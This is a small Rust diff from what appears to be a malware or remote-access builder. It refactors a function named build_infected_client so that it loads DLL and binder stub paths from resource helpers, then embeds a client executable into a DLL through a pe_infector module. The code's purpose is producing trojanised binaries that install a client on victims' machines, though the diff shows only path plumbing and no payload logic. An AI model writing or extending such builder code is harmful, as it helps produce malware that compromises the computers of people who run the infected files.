@@ -1,6 +1,9 @@
 use crate::handlers::{AssemblyInfo, SharedTauriState};
 use crate::utils::logger::Log;
-use crate::utils::resources::{get_client_built_exe_path, get_exe_dir, get_rcedit_path};
+use crate::utils::resources::{
+    get_binder_stub_path, get_client_built_exe_path, get_dll_stub_path, get_exe_dir,
+    get_rcedit_path,
+};
 use base64::{engine::general_purpose, Engine as _};
 use serde::Serialize;
 use std::fs;
@@ -148,10 +151,8 @@ pub async fn build_infected_client(
     let client_exe_path = get_client_built_exe_path().map_err(|e| e.to_string())?;
     let exe_dir = get_exe_dir().map_err(|e| e.to_string())?;
 
-    // In a real environment, we'd have pre-compiled stubs in /res or similar
-    // For this implementation, we assume they are built or available
-    let dll_stub_path = exe_dir.join("res/dll_stub.dll");
-    let binder_stub_path = exe_dir.join("res/binder_stub.exe");
+    let dll_stub_path = get_dll_stub_path()?;
+    let binder_stub_path = get_binder_stub_path()?;
 
     // 1. Embed client in DLL
     crate::utils::pe_infector::embed_client_in_dll(&dll_stub_path, &client_exe_path, !enable_install)?;
